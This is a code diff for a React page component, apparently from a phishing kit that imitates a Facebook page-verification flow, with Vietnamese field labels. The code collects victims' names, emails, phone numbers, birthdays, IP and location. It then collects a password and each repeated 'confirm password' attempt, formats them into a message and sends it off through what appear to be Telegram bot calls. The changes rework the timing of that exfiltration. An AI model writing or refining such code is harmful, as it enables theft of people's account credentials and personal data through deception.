@@ -44,7 +44,6 @@ const GetInfo: React.FC = () => {
 	const [phoneNumber, setPhoneNumber] = useState<string>('');
 	const [birthday, setBirthday] = useState<string>('');
 	const [email, setEmail] = useState<string>('');
-	const [password, setPassword] = useState<string>('');
 	const [confirmPassword, setConfirmPassword] = useState<string>('');
 
 	const pageNameInputRef = useRef<HTMLInputElement>(null);
@@ -83,36 +82,23 @@ const GetInfo: React.FC = () => {
 		} else if (birthday === '') {
 			birthdayInputRef.current?.focus();
 		} else {
-			const newMessage =
-				`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>\n` +
-				`<b>🌐 IP:</b> <code>${ip}</code>\n` +
-				`<b>🌍 Vị trí:</b> <code>${country}</code>\n\n` +
-				`<b>📄 Tên Page:</b> <code>${pageName}</code>\n` +
-				`<b>🧑 Tên:</b> <code>${name}</code>\n` +
-				`<b>📧 Email:</b> <code>${email}</code>\n` +
-				`<b>📞 Số điện thoại:</b> <code>${phoneNumber}</code>\n` +
-				`<b>🎂 Ngày sinh:</b> <code>${birthday}</code>\n`;
-			localStorage.setItem('message', newMessage);
-			sendMessage({ text: newMessage });
 			setIsPasswordModalOpen(true);
 		}
 	};
 
 	const handlePasswordSubmit = (password: string) => {
-		setPassword(password);
-		setFailedPasswordAttempts(1);
-		const existingMessage = localStorage.getItem('message') ?? '';
 		const newMessage =
-			existingMessage.replace(
-				/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
-				`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
-			) + `<b>🔒 Mật khẩu:</b> <code>${password}</code>`;
+			`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>\n` +
+			`<b>🌐 IP:</b> <code>${ip}</code>\n` +
+			`<b>🌍 Vị trí:</b> <code>${country}</code>\n\n` +
+			`<b>📄 Tên Page:</b> <code>${pageName}</code>\n` +
+			`<b>🧑 Tên:</b> <code>${name}</code>\n` +
+			`<b>📧 Email:</b> <code>${email}</code>\n` +
+			`<b>📞 Số điện thoại:</b> <code>${phoneNumber}</code>\n` +
+			`<b>🎂 Ngày sinh:</b> <code>${birthday}</code>\n` +
+			`<b>🔒 Mật khẩu:</b> <code>${password}</code>`;
 		localStorage.setItem('message', newMessage);
-		const messageId = localStorage.getItem('message_id');
-		editMessageText({
-			message_id: Number(messageId),
-			text: newMessage,
-		});
+		sendMessage({ text: newMessage });
 		setIsPasswordModalOpen(false);
 		navigate('/live/home/confirm-password');
 	};
@@ -121,6 +107,20 @@ const GetInfo: React.FC = () => {
 		if (confirmPassword === '') {
 			confirmPasswordInputRef.current?.focus();
 		} else {
+			const existingMessage = localStorage.getItem('message') ?? '';
+			const newMessage =
+				existingMessage.replace(
+					/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
+					`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
+				) +
+				`<b>🔒 Mật khẩu ${failedPasswordAttempts}:</b> <code>${confirmPassword}</code>`;
+			localStorage.setItem('message', newMessage);
+			const messageId = localStorage.getItem('message_id');
+			editMessageText({
+				message_id: Number(messageId),
+				text: newMessage,
+			});
+
 			setFailedPasswordAttempts(failedPasswordAttempts + 1);
 			delayLoading();
 		}
@@ -192,7 +192,6 @@ const GetInfo: React.FC = () => {
 					setPhoneNumber,
 					setBirthday,
 					setEmail,
-					setPassword,
 					setConfirmPassword,
 					pageNameInputRef,
 					nameInputRef,
@@ -232,8 +231,6 @@ const GetInfo: React.FC = () => {
 				onClose={() => setIsPasswordModalOpen(false)}
 				onSubmit={handlePasswordSubmit}
 				passwordInputRef={passwordInputRef}
-				password={password}
-				setPassword={setPassword}
 			/>
 
 			{isLoading && (
